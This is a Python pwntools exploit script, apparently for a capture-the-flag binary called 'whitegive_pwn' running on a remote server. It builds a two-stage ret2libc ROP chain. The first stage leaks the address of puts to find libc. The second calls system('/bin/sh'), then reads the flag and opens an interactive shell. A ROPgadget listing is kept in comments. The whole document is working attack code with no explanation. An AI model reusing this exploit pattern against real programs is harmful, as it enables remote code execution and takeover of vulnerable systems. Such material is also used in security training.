from pwn import *
from LibcSearcher import *
# context.log_level='debug'
# context.os='linux'
# context.arch='amd64'
# context.terminal=['tmux','splitw','-h']

elf=ELF("./whitegive_pwn")
libc=ELF("./libc-2.23.so")
# io=process("./whitegive_pwn")
io=remote("1.14.71.254",28586)
# bss_addr=0x601060
puts_got=elf.got[b"puts"]
puts_plt=elf.plt[b"puts"]
pop_rdi_addr=0x400763
ret_addr=0x400509
start_addr=elf.symbols[b"_start"]
# gdb.attach(io)
# pause() 
payload1=cyclic(0x18)+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(start_addr)
io.sendline(payload1)
puts_addr=u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print("start_addr: "+hex(start_addr))
print("puts_plt: "+hex(puts_plt))
print("puts_got: "+hex(puts_got))
print("leak puts _addr: "+hex(puts_addr))
# libc=LibcSearcher("puts",puts_addr)
# libc_base=puts_addr-libc.dump("puts")
print("puts_offset: "+hex(libc.symbols[b"puts"]))
print("sys_offset: "+hex(libc.symbols[b"system"]))
print("bin_offset: "+hex(next(libc.search(b"/bin/sh"))))
libc_base=puts_addr-libc.symbols[b"puts"]
print("libc_base: "+hex(libc_base))
# sys_addr=libc_base+libc.dump("system") 
sys_addr=libc_base+libc.symbols[b"system"]
print("sys_addr: "+hex(sys_addr))
# bin_addr=libc_base+libc.dump("str_bin_sh")
bin_addr=libc_base+next(libc.search(b"/bin/sh"))
print("bin_addr: "+hex(bin_addr))
payload2=cyclic(0x18)+p64(pop_rdi_addr)+p64(bin_addr)+p64(sys_addr)
io.sendline(payload2)
io.sendline(b'cat flag\n')
io.interactive()

# Gadgets information
# ============================================================
# 0x000000000040075c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040075e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400760 : pop r14 ; pop r15 ; ret
# 0x0000000000400762 : pop r15 ; ret  0x7f2f8b41f5f0
# 0x000000000040075b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040075f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004005d0 : pop rbp ; ret
# 0x0000000000400763 : pop rdi ; ret
# 0x0000000000400761 : pop rsi ; pop r15 ; ret
# 0x000000000040075d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400509 : ret

# Unique gadgets found: 11